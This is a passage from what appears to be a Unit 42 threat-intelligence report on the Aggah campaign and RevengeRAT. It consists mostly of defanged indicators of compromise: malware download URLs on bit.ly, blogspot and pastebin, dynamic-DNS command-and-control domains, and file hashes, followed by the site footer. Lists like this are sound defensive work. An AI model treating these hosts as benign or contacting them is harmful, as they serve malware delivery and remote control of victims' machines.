5d718c7ca\n12a7ac8838681a95339e24683c0c8e6410a040a8a8ce5fe72bc175b724cb0aa9\n \n \nDownload URLs\nwww.bitly[.]com/nliasjdASd1\nwww.bitly[.]com/nliasjdASd2\nwww.bitly[.]com/nliasjdASd3\nwww.bitly[.]com/nliasjdASd4\nwww.bitly[.]com/nliasjdASd5\nwww.bitly[.]com/nliasjdASd6\nwww.bitly[.]com/nliasjdASd7\nwww.bitly[.]com/nliasjdASd8\nwww.bitly[.]com/nliasjdASd9\nwww.bitly[.]com/nliasjdASd11\nwww.bitly[.]com/nliasjdASd12\nwww.bitly[.]com/nliasjdASd13\nwww.bitly[.]com/SexoPhone1\nwww.bitly[.]com/SexoPhone2\nwww.bitly[.]com/SexoPhone4\nwww.bitly[.]com/SmexEaldos1\nwww.bitly[.]com/SmexEaldos2\nwww.bitly[.]com/SmexEaldos3\nhttp://bitly[.]com/SmexEaldos4\nwww.bitly[.]com/SmexEaldos5\nwww.bitly[.]com/SmexEaldos6\nwww.bitly[.]com/SmexEaldos7\nwww.bitly[.]com/SmexEaldos8\nwww.bitly[.]com/SmexEaldos9\nwww.bitly[.]com/SmexEaldos10\nwww.bitly[.]com/XAMSeWaWz\nwww.bitly[.]com/CAEanwQA\nwww.bitly[.]com/MinPoXAsUKx\nwww.bitly[.]com/MinPoXAs\nhttp:/bitly[.]com/chutter1\nwww.bitly[.]com/doc201901000791\nwww.bitly[.]com/doc201901000793\nwww.bitly[.]com/ASDAWnZqWas\nhttps://bjm9.blogspot[.]com\nemawattttson.blogspot[.]com\nhttps://treffictesgn.blogspot[.]com\nhttps://miganshumaratamoligossa.blogspot[.]com\nhttps://buydildoonline.blogspot[.]com\nhttps://pastebin[.]com/raw/2LDaeHE1\nhttp://pastebin[.]com/raw/YYZq1XR0\nhttps://pastebin[.]com/raw/tb5gHu2G\nhttp://pastebin[.]com/raw/0c9cC2iM\nhttp://pastebin[.]com/raw/sgawvit9\n \nThe following indicators were identified associated with RevengeRAT, however, may not be exclusive to\nRevengeRAT\nfrankmana.duckdns[.]org\nworkfine11.duckdns[.]org\noldmandnsch.duckdns[.]org\noldmandnsch.duckdns[.]org\nblackhagga.duckdns[.]org\nskyrocket1.duckdns[.]org\nskyrocket1.duckdns[.]org\nkronoz.duckdns[.]org\noldmandnsch.duckdns[.]org\nkronozzz2.duckdns[.]org\nlulla.duckdns[.]org\ndecent.myvnc[.]com\ndecent5.myvnc[.]com\njayztools1.ddns[.]net\njayztools2.ddns[.]net\njayztools3.ddns[.]net\ntotallol.duckdns[.]org\ntotallol1.duckdns[.]org\ntotallol2.duckdns[.]org\ntotallol3.duckdns[.]org\ndecent2.myvnc[.]com\ndecent3.myvnc[.]com\ndecent1.myvnc[.]com\ndecent4.myvnc[.]com\njordanchen736.sytes[.]net\njordanchen7361.sytes[.]net\njordanchen7362.sytes[.]net\njordanchen7363.sytes[.]net\nlalacious1.serveftp[.]com\nlalacious2.serveftp[.]com\nlalacious3.serveftp[.]com\nlalacious4.serveftp[.]com\nmastermana1.serveirc[.]com\nmastermana2.serveirc[.]com\nmastermana3.serveirc[.]com\nmastermana4.serveirc[.]com\nmastermana5.serveirc[.]com\nlullikhao.ddns[.]net\nlullikhao1.ddns[.]net\nlullikhao2.ddns[.]net\nbullol.duckdns[.]org\nBy Robert Falcone  and Brittany Barbehenn\nApril 17, 2019 at 12:01 AM\nCategory: Unit 42\nTags: Aggah , RevengeRAT , Template Injection\nSearch Unit 42\nSHARE \ncocomo.ddns[.]net\nhaggasinger2.ddns[.]net\nhaggasinger.ddns[.]net\nhaggasinger1.ddns[.]net\nloramer1.ddnsking[.]com\neasykill.servebeer[.]com\neasykill3.servebeer[.]com\neasykill2.servepics[.]com\neasykill1.servepics[.]com\neasykill3.servepics[.]com\nhelloweenhagga.ddns[.]net\nhelloweenhagga3.ddns[.]net\nhelloweenhagga4.ddns[.]net\nhelloweenhagga2.ddns[.]net\nrevengerx211.sytes[.]net\nrevengerx212.sytes[.]net\nrevengerx213.sytes[.]net\nrevengerx214.sytes[.]net\nrevengerx215.sytes[.]net\nrevengerx216.sytes[.]net\nrevengerx217.sytes[.]net\nrevengerx218.sytes[.]net\nrevengerx219.sytes[.]net\nrevengerx210.sytes[.]net\noffice365update.duckdns[.]org\nsysten32.ddns[.]net\nbhenchood.ddns[.]net\nemmanuelstevo.ddns[.]net\nzinderhola1.ddns[.]net\nzinderhola.ddns[.]net\nmyownlogs.duckdns[.]org\ncocomo1.ddns[.]net\ncocomo10.serveblog[.]net\ncocomo2.ddns[.]net\ncocomo2.serveblog[.]net\ncocomo3.serveblog[.]net\ncocomo4.serveblog[.]net\ncocomo5.serveblog[.]net\ncocomo6.serveblog[.]net\ncocomo7.serveblog[.]net\ncocomo8.serveblog[.]net\ncocomo9.serveblog[.]net\nmrcode.hopto[.]org\nmrcode1.hopto[.]org\nmrcode2.hopto[.]org\npussi2442.ddns[.]net\nUnit 42 has identified additional indicators associated with the Aggah campaign. These indicators include:\nDelivery documents:\n63684ec73be78b2676470484602caf7090e73ed589618cedb017a09b15cc4abc\n89d925222af65a01b69a65ae4bba878c0c64cdb9ac06d54d9da6bf1911c5a41d\nPastebin URLs:\nhttps://pastebin[.]com/raw/5EH8DHwd\nhttps://pastebin[.]com/raw/TaCG9fsP\nhttp://pastebin[.]com/raw/5J5dtrzL\nBit.ly URLs:\nhttps://bitly[.]com/ChutasdhikhasdAS[number 1‐20]\nBlogspot:\nhttps://miganshumarataa.blogspot[.]com\nRevengeRAT:\n0f266a7c9ff37313e6d8b823e3407271e635d565cde3e0829a15fffa65f776d8\nC2 Domains:\nmajorsss.duckdns[.]org\ncycbra.duckdns[.]org\n \nGet updates from Palo Alto  Networks!\nSign up to receive the latest news, cyber threat intelligence and research from us\nEmail address\nSubscribe\nI'm not a robot\nreCAPTCHA\nPrivacy  - Terms\nBy submitting this form, you agree to our Terms of Use  and acknowledge\nour Privacy Statement .\n© 2020 Palo Alto Networks, Inc. All rights reserved.\nPopular Resources\nResource Center\nBlog\nCommunities\nTech Docs\nUnit 42\nSitemap\nLegal No ces\nPrivacy\nTerms of Use\nDocuments\nAccount\nManage Subscriptions\nReport a Vulnerability\n "
}